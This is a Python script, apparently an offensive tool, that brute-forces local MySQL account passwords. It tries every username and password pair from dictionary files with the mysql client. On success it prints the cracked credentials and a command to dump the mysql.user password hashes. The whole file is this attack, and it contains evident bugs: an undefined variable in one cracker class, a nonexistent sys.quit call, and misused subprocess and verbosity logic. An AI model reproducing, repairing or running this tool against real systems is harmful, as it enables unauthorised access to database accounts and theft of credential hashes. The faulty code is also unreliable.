print("[+] Local MySQL Password Bruteforcer")

import subprocess
import sys
from optparse import OptionParser

class multi_cracker():
    def setup(self,options,dict,users_dict):
        self.options = options
        self.dict = dict
        self.users_dict = users_dict
        
    def run(self):
        for users in self.users_dict:
            for elem in self.dict:#
                # if the password is empty
                if elem == ' ':
                    cmd = "mysql -u%s -e\"show databases\"" %(users.strip("\n"))
                else:
                    cmd = "mysql -u%s -p%s -e\"show databases\"" %(users.strip("\n"),elem.strip("\n"))
                p = subprocess.Popen(cmd, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                for line in iter(p.stdout.readline, ''):
                    if line.startswith("Database"):
                        if self.options.force == True:
                            print("[+] We are in !")
                            print("[+] Username: '%s' have the following password: '%s'  " %(users.strip("\n"),elem.strip("\n")))
                            print("\t[+] Execute this string to get list of users:")
                            print("\t\t[+] mysql -u%s -p%s -e\"select user,password from mysql.user;\""%(users.strip("\n"),elem.strip("\n")))
                            print("Done!")
                            sys.quit(1)
                        else:
                            print("[+] Username: '%s' have the following password: '%s'  " %(users.strip("\n"),elem.strip("\n")))
                for line in iter(p.stderr.readline, ''):
                    if line.startswith("ERROR 2003"):
                        print("[!] Unable to Connect to database")
                        print("[!] Quitting")
                        sys.exit(1)
                    elif line.startswith("ERROR 1045"):
                        if self.options.verbose == False:
                            print("[!] Failed Password: ", elem.strip("\n"))
            
            # Clean after every try!
            sys.stdout.flush()
            sys.stderr.flush()
            p.wait()
            print("Done!")
            
class cracker():
    def setup(self,options,dict):
        self.options = options
        self.dict = dict
    
    def run(self):
        for elem in self.dict:
            # if the password is empty
            if elem == ' ':
                cmd = "mysql -u%s -e\"show databases\"" %(users.strip("\n"))
            else:
                cmd = "mysql -u%s -p%s -e\"show databases\"" %(users.strip("\n"),elem.strip("\n"))
            p = subprocess.Popen(cmd, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            for line in iter(p.stdout.readline, ''):
                if line.startswith("Database"):
                    print("[+] We are in !")
                    print("[+] Username: '%s' have the following password: '%s'  " %(self.options.username,elem.strip("\n")))
                    print("\t[+] Execute this string to get list of users:")
                    print("\t\t[+] mysql -u%s -p%s -e\"select user,password from mysql.user;\""%(self.options.username,elem.strip("\n")))
            for line in iter(p.stderr.readline, ''):
                 if line.startswith("ERROR 2003"):
                    print("[!] Unable to Connect to database")
                    print("[!] Quitting")
                    sys.exit(1)
                 elif line.startswith("ERROR 1045"):
                    if self.options.verbose == False:
                        print("[!] Failed Password: ", elem.strip("\n")) 
            
            # Clean after every try!
            sys.stdout.flush()
            sys.stderr.flush()
            p.wait()
            print("Done!")
            
def dictlist(file):
    """ Retrun dictionary as list """
    #Note: This is not the most memory-effective way .. we could have use mmap
    words = list()
    for elems in open(file,"r"):
        words.append(elems)
    return words

def getfilesize(file):
    """ Return size of a dictionary to use"""
    f = open(file,"r")
    line_numbers = sum(1 for line in f)
    f.close()
    return line_numbers
    

def crack_the_box(options):
    """ Init Cracking process"""
    
    try:
        dictsize = getfilesize(options.password_dictionary)
        print("\t[+] Running MySQL password attack against user: %s" %(options.username))
        print("\t[+] Passwords to crack: %d passwords" %(int(dictsize)))
        t = cracker()
        t.setup(options,dictlist(options.password_dictionary))
        t.run() 
    except Exception:
        print("[-] Something went wrong ")

def crack_the_box2(options):
    """ Init Cracking process"""
    try:
        dictsize = getfilesize(options.password_dictionary)
        dictsize_users = getfilesize(options.dictionary_usernames)
        print("\t[+] Running MySQL password attack against : %s users" %(dictsize_users))
        print("\t[+] Passwords to crack: %d for each user" %(int(dictsize)))
        t = multi_cracker()
        t.setup(options,dictlist(options.password_dictionary),dictlist(options.dictionary_usernames))
        t.run()
    except Exception:
        print("[-] Something went wrong ")

def main():
    usage = """
    To crack single password for a user:
    options: -d <dict> -u <user>
    To crack passwords for multiple users:
    options: -d <dict> -U <user dict>
    """
    parser = OptionParser(usage)
    parser.add_option("-d", "--dictionary", dest="password_dictionary",
                  help="local password dictionary to use", metavar="FILE")
    parser.add_option("-U", "--usernames", dest="dictionary_usernames",
                  help="local username dictionary to use", metavar="FILE")
    parser.add_option("-v", "--verbose",
                  action="store_false", dest="verbose", default=True,
                  help="don't print any messages")
    parser.add_option("-u", "--username", dest="username",
                  help="username to crack password against")
    parser.add_option("-f", "--force", dest="force",
                  help="force quit after first successful crack", default=False)
    (options, args) = parser.parse_args()
    
    # If we crack only single username
    if options.username!= None and options.dictionary_usernames == None:
        crack_the_box(options)
    # We are cracking dictionary vs dictionary
    if options.dictionary_usernames != None:
        crack_the_box2(options)


if __name__ == '__main__':
    main()
